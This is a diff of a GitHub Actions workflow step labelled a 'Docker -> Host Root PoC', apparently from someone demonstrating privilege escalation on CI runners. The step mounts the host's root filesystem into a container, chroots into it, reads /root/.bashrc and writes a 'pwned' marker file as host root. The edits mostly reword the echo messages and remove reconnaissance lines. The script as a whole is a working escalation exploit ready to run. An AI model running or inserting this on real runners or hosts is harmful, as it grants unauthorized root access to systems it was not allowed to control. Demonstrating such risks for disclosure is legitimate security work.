@@ -13,40 +13,30 @@ jobs:
 
       - name: Docker -> Host Root PoC
         run: |
-          echo "=== [*] Context as non-root user ==="
-          whoami
-          id
-          groups
-
           echo
-          echo "=== [*] Using docker group to reach host root ==="
-          ls -l /var/run/docker.sock || echo "[-] No docker.sock"
-          docker version || echo "[-] docker not working"
-
-          echo
-          echo "=== [*] Spawning container and chrooting into host ==="
+          echo "Starting container and chrooting into host"
           docker run --rm -v /:/host ubuntu bash -c '
-            echo "[*] Inside container (should be root here):"
+            echo "Inside container (we should be root here):"
             whoami
             id
 
-            echo "[*] chroot into host filesystem and run commands as host root..."
+            echo "chroot into host filesystem and run commands as host root"
             chroot /host bash -c "
-              echo \"[+] In host namespace now\" 
+              echo \"Post chroot command now" 
               echo \"whoami: \$(whoami)\"
               echo \"id: \$(id)\"
-
+              
               echo
-              echo \"[+] Reading /root/.bashrc as proof of root:\"
+              echo \"tested by reading /root/.bashrc as proof \"
               head -n 10 /root/.bashrc || echo \"could not read /root/.bashrc\"
 
               echo
-              echo \"[+] Creating marker file at /pwned_by_root_from_github_actions.txt\"
+              echo \"Creating poc file at /pwned_by_root_from_github_actions.txt\"
               echo \"pwned by github actions\" > /pwned_by_root_from_github_actions.txt
               ls -l /pwned_by_root_from_github_actions.txt || true
             "
           '
-
+    
           echo
-          echo "=== [*] Back on host as runner, verifying root-created marker ==="
+          echo "Back on host as runner, verifying root-created marker using priv esc"
           ls -l /pwned_by_root_from_github_actions.txt || echo "[-] Marker missing (exploit failed)"
